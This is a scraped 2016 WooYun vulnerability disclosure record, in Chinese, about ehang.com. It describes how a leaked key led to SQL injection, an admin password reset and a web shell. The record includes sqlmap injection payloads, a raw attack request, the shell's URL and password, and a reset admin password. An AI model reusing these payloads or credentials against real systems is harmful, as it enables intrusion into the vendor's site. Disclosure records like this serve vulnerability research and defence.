{"id": 75146, "wybug_id": "wooyun-2016-0168409", "wybug_title": "亿航某处信息泄漏导致某站getshell", "wybug_corp": "ehang.com", "wybug_author": "mango", "wybug_date": "2016-01-08 15:25", "wybug_open_date": "2016-02-22 16:48", "wybug_type": "敏感信息泄露", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感信息泄露"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-01-08：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-01-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-21：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-31：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-02-10：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-22：\t细节向公众公开  简要描述： ~~~~ 有礼物吗~~~ ghost 2.0  详细说明：  1.信息泄漏导致getshell根绝之前有人在乌云爆的信息 WooYun: 亿航BBS源码包泄露及后台弱口令 \n\n发现key  并且未失效,那么利用key可以做很多事情包括进行sql注入\n\n成功注入出管理员密码 但是管理员并没有多大权限,而且一些漏洞都被堵住了,那我就先重置高权限的 Ehang账户 \n\n Ehang 密码为mango1995成功登陆后台 并利用uc_server 包含漏洞 就行getshell    (http://wooyun.org/bugs/wooyun-2014-062388)\n\nhttp://bbs.ehang.com/uc_server/data/tmp/x.php 密码c1   漏洞证明：  \n2.SQL注入3.POST /checkorder/ HTTP/1.1Content-Length: 178Content-Type: application/x-www-form-urlencodedX-Requested-With: XMLHttpRequestReferer: http://buy.ehang.com:80/Cookie: PHPSESSID=vnvo3h8ckht4a5729p6475nor7Host: buy.ehang.comConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36Accept: */*email=sample%40email.tst&name=&submit=submit参数为email name都存在问题sqlmap identified the following injection points with a total of 131 HTTP(s) requests:---Parameter: name (POST)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: email=sample@email.tst&name=\") AND 1062=1062 AND (\"dAoX\"=\"dAoX&submit=submit    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT - comment)    Payload: email=sample@email.tst&name=\") AND (SELECT * FROM (SELECT(SLEEP(5)))IAEw)#&submit=submit    Type: UNION query    Title: Generic UNION query (NULL) - 29 columns    Payload: email=sample@email.tst&name=\") UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7170767071,0x787445544f45664f457a,0x71706a7671),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- &submit=submit---web server operating system: Linux Ubuntuweb application technology: Apache 2.4.7, PHP 5.5.9back-end DBMS: MySQL 5.0.12available databases [4]:[*] ehangorder[*] information_schema[*] mysql[*] performance_schema\n   修复方案：     重新生成新的key 定期做线上检查~  本来是先给你们漏洞让你们先修复再提交的，但是打你们电话没人接，没办法我就先提交乌云了。   版权声明：转载请注明来源 mango@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：18  确认时间：2016-01-11 11:42 厂商回复： 谢谢mango，已经确认。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-01-08 16:04 |    \t\tmissy \t\t\t( 普通白帽子  |\t\t\t        Rank:816 漏洞数:220        | .....-3-3-3-3-3-3-3-3-3-3-3-3-3)\t\t \n  师傅厉害    \n     2016-01-08 20:25 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1423 漏洞数:203        | 。)\t\t \n  我日你要这么多ranks干嘛    \n     2016-01-09 02:34 |    \t\tmango \t\t\t( 核心白帽子 |\t\t\t        Rank:1868 漏洞数:275        | 出一份微不足道的\"力\")\t\t \n    也是6  修复了，也不来确认    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 18, "Ranks": null}